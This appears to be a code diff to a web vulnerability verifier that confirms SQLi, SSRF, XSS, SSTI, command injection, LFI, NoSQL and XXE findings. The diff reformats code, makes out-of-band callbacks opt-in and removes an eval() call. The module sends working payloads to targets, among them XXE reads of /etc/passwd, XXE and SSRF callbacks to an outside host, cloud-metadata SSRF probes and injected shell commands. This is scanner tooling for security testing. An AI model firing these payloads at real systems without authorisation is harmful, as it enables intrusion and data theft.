@@ -12,6 +12,7 @@ Verification Strategy:
   - CMDI: time-based → output-based → blind (3 methods)
   - LFI: path traversal → wrapper → log poisoning (3 methods)
 """
+
 import random
 import re
 import string
@@ -22,7 +23,6 @@ from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
 
 import requests
 
-from tools.http_client import HttpClient
 from tools.log_utils import get_logger
 from tools.settings import settings
 
@@ -62,13 +62,20 @@ class SecondOrderVerifier:
             # High-confidence finding
     """
 
-    def __init__(self, sess: Optional['requests.Session'] = None, timeout: float = 10.0):
-        self.sess = sess or HttpClient()
+    def __init__(self, sess: Optional["requests.Session"] = None, timeout: float = 10.0):
+        # Use the project's normal requests-based session by default. The raw
+        # socket HttpClient is for request-smuggling paths only; using it here
+        # bypassed proxies/mocks and made offline verification impossible.
+        if sess is None:
+            sess = requests.Session()
+            sess.verify = settings.verify_ssl
+        self.sess = sess
         self.timeout = timeout
         self._lock = None
 
-    def verify(self, url: str, param: str, vuln_type: str,
-               original_evidence: Dict = None, **kwargs) -> VerificationResult:
+    def verify(
+        self, url: str, param: str, vuln_type: str, original_evidence: Dict = None, **kwargs
+    ) -> VerificationResult:
         original_evidence = original_evidence or {}
         method_map = {
             "sqli": self._verify_sqli,
@@ -83,14 +90,27 @@ class SecondOrderVerifier:
         verifier = method_map.get(vuln_type)
         if not verifier:
             return VerificationResult(
-                vuln_type=vuln_type, confirmed=False, confidence=0.0,
+                vuln_type=vuln_type,
+                confirmed=False,
+                confidence=0.0,
                 methods_tried=["unsupported"],
-                details={"error": "No verifier for %s" % vuln_type}
+                details={"error": "No verifier for %s" % vuln_type},
             )
         return verifier(url, param, original_evidence, **kwargs)
 
     def _random_suffix(self, length=8) -> str:
-        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+        return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))
+
+    def _configured_oob_domain(self, prefix: str) -> Optional[str]:
+        """Return a per-run callback domain, or None when OOB is not configured.
+
+        OOB callbacks are opt-in (AIMY_OOB_DOMAIN) so the tool never sends
+        target traffic to a third-party DNS service by default.
+        """
+        domain = settings.oob_domain.strip()
+        if not domain:
+            return None
+        return "%s-%s.%s" % (prefix, self._random_suffix(6), domain)
 
     def _inject_param(self, url: str, param: str, value: str) -> str:
         parsed = urlparse(url)
@@ -109,17 +129,30 @@ class SecondOrderVerifier:
         new_headers["X-Verify-Token"] = value
         return new_headers
 
-    def _make_request(self, url: str, method="GET", data=None,
-                      headers=None, cookies=None) -> Tuple[Optional[int], str, float]:
+    def _make_request(
+        self, url: str, method="GET", data=None, headers=None, cookies=None
+    ) -> Tuple[Optional[int], str, float]:
         try:
             start = time.time()
             if method == "POST":
-                resp = self.sess.post(url, data=data, headers=headers,
-                                      cookies=cookies, timeout=self.timeout,
-                                      allow_redirects=False, verify=settings.verify_ssl)
+                resp = self.sess.post(
+                    url,
+                    data=data,
+                    headers=headers,
+                    cookies=cookies,
+                    timeout=self.timeout,
+                    allow_redirects=False,
+                    verify=settings.verify_ssl,
+                )
             else:
-                resp = self.sess.get(url, headers=headers, cookies=cookies,
-                                     timeout=self.timeout, allow_redirects=False, verify=settings.verify_ssl)
+                resp = self.sess.get(
+                    url,
+                    headers=headers,
+                    cookies=cookies,
+                    timeout=self.timeout,
+                    allow_redirects=False,
+                    verify=settings.verify_ssl,
+                )
             elapsed = time.time() - start
             return resp.status_code, resp.text, elapsed
         except Exception as e:
@@ -160,7 +193,9 @@ class SecondOrderVerifier:
             _, body_f, _ = self._make_request(url_f, method, data_f)
             if body_t and body_f and body_t != body_f:
                 methods_succeeded.append("boolean_based")
-                all_evidence.append({"method": "boolean_based", "true_len": len(body_t), "false_len": len(body_f)})
+                all_evidence.append(
+                    {"method": "boolean_based", "true_len": len(body_t), "false_len": len(body_f)}
+                )
         except Exception as e:
             logger.debug("Boolean verification failed: %s", e)
 
@@ -198,9 +233,9 @@ class SecondOrderVerifier:
                 url_err = self._inject_param(url, param, payload)
                 data_err = None
             _, body_err, _ = self._make_request(url_err, method, data_err)
-            if body_err and re.search(r'duplicate entry.*0x[0-9a-f]+', body_err, re.I):
+            if body_err and re.search(r"duplicate entry.*0x[0-9a-f]+", body_err, re.I):
                 methods_succeeded.append("error_based")
-                ver_match = re.search(r'(\d+\.\d+[\.\d]*)', body_err)
+                ver_match = re.search(r"(\d+\.\d+[\.\d]*)", body_err)
                 ver = ver_match.group(1) if ver_match else "unknown"
                 all_evidence.append({"method": "error_based", "version": ver})
         except Exception as e:
@@ -229,29 +264,33 @@ class SecondOrderVerifier:
         is_post = kwargs.get("is_post", False)
         method = "POST" if is_post else "GET"
 
-        # Method 1: DNS callback verification
-        methods_tried.append("dns_callback")
-        try:
-            callback_domain = "aimy-%s.oast.fun" % self._random_suffix(6)
-            payload = "http://%s" % callback_domain
-            if is_post and post_data:
-                url_ssrf = url
-                data_ssrf = self._inject_body(post_data, param, payload)
-            else:
-                url_ssrf = self._inject_param(url, param, payload)
-                data_ssrf = None
-            self._make_request(url_ssrf, method, data_ssrf)
-            time.sleep(2)
-            import socket
+        # Method 1: DNS callback verification (opt-in: needs AIMY_OOB_DOMAIN)
+        callback_domain = self._configured_oob_domain("aimy")
+        if callback_domain:
+            methods_tried.append("dns_callback")
             try:
-                resolved = socket.getaddrinfo(callback_domain, 80)
-                if resolved:
-                    methods_succeeded.append("dns_callback")
-                    all_evidence.append({"method": "dns_callback", "domain": callback_domain, "resolved": True})
-            except socket.gaierror:
-                pass
-        except Exception as e:
-            logger.debug("DNS callback verification failed: %s", e)
+                payload = "http://%s" % callback_domain
+                if is_post and post_data:
+                    url_ssrf = url
+                    data_ssrf = self._inject_body(post_data, param, payload)
+                else:
+                    url_ssrf = self._inject_param(url, param, payload)
+                    data_ssrf = None
+                self._make_request(url_ssrf, method, data_ssrf)
+                time.sleep(2)
+                import socket
+
+                try:
+                    resolved = socket.getaddrinfo(callback_domain, 80)
+                    if resolved:
+                        methods_succeeded.append("dns_callback")
+                        all_evidence.append(
+                            {"method": "dns_callback", "domain": callback_domain, "resolved": True}
+                        )
+                except socket.gaierror:
+                    pass
+            except Exception as e:
+                logger.debug("DNS callback verification failed: %s", e)
 
         # Method 2: Response difference verification
         methods_tried.append("response_diff")
@@ -259,8 +298,12 @@ class SecondOrderVerifier:
             true_url = "http://127.0.0.1"
             false_url = "http://127.0.0.2"
             if is_post and post_data:
-                _, body_t, _ = self._make_request(url, "POST", self._inject_body(post_data, param, true_url))
-                _, body_f, _ = self._make_request(url, "POST", self._inject_body(post_data, param, false_url))
+                _, body_t, _ = self._make_request(
+                    url, "POST", self._inject_body(post_data, param, true_url)
+                )
+                _, body_f, _ = self._make_request(
+                    url, "POST", self._inject_body(post_data, param, false_url)
+                )
             else:
                 _, body_t, _ = self._make_request(self._inject_param(url, param, true_url))
                 _, body_f, _ = self._make_request(self._inject_param(url, param, false_url))
@@ -286,9 +329,17 @@ class SecondOrderVerifier:
                     url_oob = self._inject_param(url, param, internal_url)
                     data_oob = None
                 _, body_oob, _ = self._make_request(url_oob, method, data_oob)
-                if body_oob and any(kw in body_oob.lower() for kw in ["ami-id", "instance-id", "hostname", "iam"]):
+                if body_oob and any(
+                    kw in body_oob.lower() for kw in ["ami-id", "instance-id", "hostname", "iam"]
+                ):
                     methods_succeeded.append("blind_oob")
-                    all_evidence.append({"method": "blind_oob", "internal_url": internal_url, "leak": body_oob[:200]})
+                    all_evidence.append(
+                        {
+                            "method": "blind_oob",
+                            "internal_url": internal_url,
+                            "leak": body_oob[:200],
+                        }
+                    )
                     break
         except Exception as e:
             logger.debug("Blind OOB verification failed: %s", e)
@@ -332,7 +383,9 @@ class SecondOrderVerifier:
                 idx = body_xss.index(marker)
                 ctx_start = max(0, idx - 50)
                 ctx_end = min(len(body_xss), idx + len(marker) + 50)
-                all_evidence.append({"method": "reflected_marker", "context": body_xss[ctx_start:ctx_end]})
+                all_evidence.append(
+                    {"method": "reflected_marker", "context": body_xss[ctx_start:ctx_end]}
+                )
         except Exception as e:
             logger.debug("Marker reflection failed: %s", e)
 
@@ -347,7 +400,7 @@ class SecondOrderVerifier:
                 url_html = self._inject_param(url, param, html_payload)
                 data_html = None
             _, body_html, _ = self._make_request(url_html, method, data_html)
-            if body_html and re.search(r'<aimy_xss_[0-9]+>', body_html):
+            if body_html and re.search(r"<aimy_xss_[0-9]+>", body_html):
                 methods_succeeded.append("html_context")
                 all_evidence.append({"method": "html_context", "unescaped": True})
         except Exception as e:
@@ -395,8 +448,9 @@ class SecondOrderVerifier:
         # Method 1: Math evaluation
         methods_tried.append("math_eval")
         try:
-            expr = "%s*%s" % (random.randint(7, 9), random.randint(7, 9))
-            expected = str(eval(expr))
+            a, b = random.randint(7, 9), random.randint(7, 9)
+            expr = "%d*%d" % (a, b)
+            expected = str(a * b)
             payloads = [
                 ("{{%s}}" % expr, "jinja2"),
                 ("${%s}" % expr, "velocity"),
@@ -413,7 +467,9 @@ class SecondOrderVerifier:
                 _, body_ssti, _ = self._make_request(url_ssti, method, data_ssti)
                 if body_ssti and expected in body_ssti:
                     methods_succeeded.append("math_eval")
-                    all_evidence.append({"method": "math_eval", "engine": engine, "result": expected})
+                    all_evidence.append(
+                        {"method": "math_eval", "engine": engine, "result": expected}
+                    )
                     break
         except Exception as e:
             logger.debug("Math eval verification failed: %s", e)
@@ -457,7 +513,7 @@ class SecondOrderVerifier:
                     url_file = self._inject_param(url, param, payload)
                     data_file = None
                 _, body_file, _ = self._make_request(url_file, method, data_file)
-                if body_file and re.search(r'uid=\d+', body_file):
+                if body_file and re.search(r"uid=\d+", body_file):
                     methods_succeeded.append("file_read")
                     all_evidence.append({"method": method_name, "rce": True})
                     break
@@ -536,11 +592,13 @@ class SecondOrderVerifier:
             self._make_request(url_blind, method, data_blind)
             verify_payload = "cat %s 2>/dev/null || echo AIMY_BLIND_FAIL" % blind_file
             if is_post and post_data:
-                _, body_verify, _ = self._make_request(url, method,
-                    self._inject_body(post_data, param, verify_payload))
+                _, body_verify, _ = self._make_request(
+                    url, method, self._inject_body(post_data, param, verify_payload)
+                )
             else:
                 _, body_verify, _ = self._make_request(
-                    self._inject_param(url, param, verify_payload))
+                    self._inject_param(url, param, verify_payload)
+                )
             if body_verify and "AIMY_BLIND_FAIL" not in body_verify:
                 methods_succeeded.append("blind_file")
                 all_evidence.append({"method": "blind_file", "file": blind_file})
@@ -579,10 +637,12 @@ class SecondOrderVerifier:
         try:
             if is_post and post_data:
                 _, control_body, _ = self._make_request(
-                    url, method, self._inject_body(post_data, param, control_payload))
+                    url, method, self._inject_body(post_data, param, control_payload)
+                )
             else:
                 _, control_body, _ = self._make_request(
-                    self._inject_param(url, param, control_payload), method, None)
+                    self._inject_param(url, param, control_payload), method, None
+                )
         except Exception as e:
             logger.debug("LFI control request failed: %s", e)
         try:
@@ -630,11 +690,20 @@ class SecondOrderVerifier:
                 if body_wrap:
                     if wrapper_type == "base64":
                         import base64
+
                         try:
-                            decoded = base64.b64decode(body_wrap.strip()).decode('utf-8', errors='ignore')
+                            decoded = base64.b64decode(body_wrap.strip()).decode(
+                                "utf-8", errors="ignore"
+                            )
                             if "root:" in decoded:
                                 methods_succeeded.append("wrapper")
-                                all_evidence.append({"method": "wrapper", "type": wrapper_type, "decoded": decoded[:200]})
+                                all_evidence.append(
+                                    {
+                                        "method": "wrapper",
+                                        "type": wrapper_type,
+                                        "decoded": decoded[:200],
+                                    }
+                                )
                                 break
                         except Exception:
                             pass
@@ -649,7 +718,12 @@ class SecondOrderVerifier:
         methods_tried.append("log_poisoning")
         try:
             poison_marker = "AIMYLOG%s" % self._random_suffix(6)
-            self.sess.get(url, headers={"User-Agent": poison_marker}, timeout=self.timeout, verify=settings.verify_ssl)
+            self.sess.get(
+                url,
+                headers={"User-Agent": poison_marker},
+                timeout=self.timeout,
+                verify=settings.verify_ssl,
+            )
             log_paths = ["/var/log/apache2/access.log", "/var/log/nginx/access.log"]
             for log_path in log_paths:
                 if is_post and post_data:
@@ -699,6 +773,7 @@ class SecondOrderVerifier:
             for payload in payloads:
                 if is_post and post_data:
                     import json
+
                     url_nosql = url
                     data_nosql = self._inject_body(post_data, param, json.dumps(payload))
                     headers = {"Content-Type": "application/json"}
@@ -719,6 +794,7 @@ class SecondOrderVerifier:
         try:
             if is_post and post_data:
                 import json
+
                 data_true = self._inject_body(post_data, param, json.dumps({"$where": "true"}))
                 data_false = self._inject_body(post_data, param, json.dumps({"$where": "false"}))
                 headers = {"Content-Type": "application/json"}
@@ -758,11 +834,11 @@ class SecondOrderVerifier:
         # Method 1: File read via XXE
         methods_tried.append("file_read")
         try:
-            xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
+            xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<data>&xxe;</data>'''
+<data>&xxe;</data>"""
             headers = {"Content-Type": "application/xml"}
             _, body_xxe, _ = self._make_request(url, "POST", xxe_payload, headers)
             if body_xxe and "root:" in body_xxe:
@@ -774,41 +850,46 @@ class SecondOrderVerifier:
         # Method 2: Blind XXE via error
         methods_tried.append("error_based")
         try:
-            error_payload = '''<?xml version="1.0" encoding="UTF-8"?>
+            error_payload = """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
   <!ENTITY xxe SYSTEM "file:///nonexistent_aimy_file">
 ]>
-<data>&xxe;</data>'''
+<data>&xxe;</data>"""
             headers = {"Content-Type": "application/xml"}
             _, body_err, _ = self._make_request(url, "POST", error_payload, headers)
-            if body_err and re.search(r'error|exception|no such|not found|xml', body_err, re.I):
+            if body_err and re.search(r"error|exception|no such|not found|xml", body_err, re.I):
                 methods_succeeded.append("error_based")
                 all_evidence.append({"method": "error_based", "error_hint": body_err[:200]})
         except Exception as e:
             logger.debug("XXE error-based verification failed: %s", e)
 
-        # Method 3: Out-of-band XXE
-        methods_tried.append("oob")
-        try:
-            oob_domain = "aimy-xxe-%s.oast.fun" % self._random_suffix(6)
-            oob_payload = '''<?xml version="1.0" encoding="UTF-8"?>
+        # Method 3: Out-of-band XXE (opt-in: needs AIMY_OOB_DOMAIN)
+        oob_domain = self._configured_oob_domain("aimy-xxe")
+        if oob_domain:
+            methods_tried.append("oob")
+            try:
+                oob_payload = (
+                    """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
   <!ENTITY xxe SYSTEM "http://%s/">
 ]>
-<data>&xxe;</data>''' % oob_domain
-            headers = {"Content-Type": "application/xml"}
-            self._make_request(url, "POST", oob_payload, headers)
-            time.sleep(2)
-            import socket
-            try:
-                resolved = socket.getaddrinfo(oob_domain, 80)
-                if resolved:
-                    methods_succeeded.append("oob")
-                    all_evidence.append({"method": "oob", "domain": oob_domain})
-            except socket.gaierror:
-                pass
-        except Exception as e:
-            logger.debug("XXE OOB verification failed: %s", e)
+<data>&xxe;</data>"""
+                    % oob_domain
+                )
+                headers = {"Content-Type": "application/xml"}
+                self._make_request(url, "POST", oob_payload, headers)
+                time.sleep(2)
+                import socket
+
+                try:
+                    resolved = socket.getaddrinfo(oob_domain, 80)
+                    if resolved:
+                        methods_succeeded.append("oob")
+                        all_evidence.append({"method": "oob", "domain": oob_domain})
+                except socket.gaierror:
+                    pass
+            except Exception as e:
+                logger.debug("XXE OOB verification failed: %s", e)
 
         result.methods_tried = methods_tried
         result.methods_succeeded = methods_succeeded
@@ -822,8 +903,15 @@ class SecondOrderVerifier:
         return result
 
 
-def check(url: str, param: str, vuln_type: str, sess=None,
-          timeout: float = 10.0, evidence: Dict = None, **kwargs) -> Dict:
+def check(
+    url: str,
+    param: str,
+    vuln_type: str,
+    sess=None,
+    timeout: float = 10.0,
+    evidence: Dict = None,
+    **kwargs,
+) -> Dict:
     verifier = SecondOrderVerifier(sess, timeout)
     result = verifier.verify(url, param, vuln_type, evidence or {}, **kwargs)
     return result.to_dict()
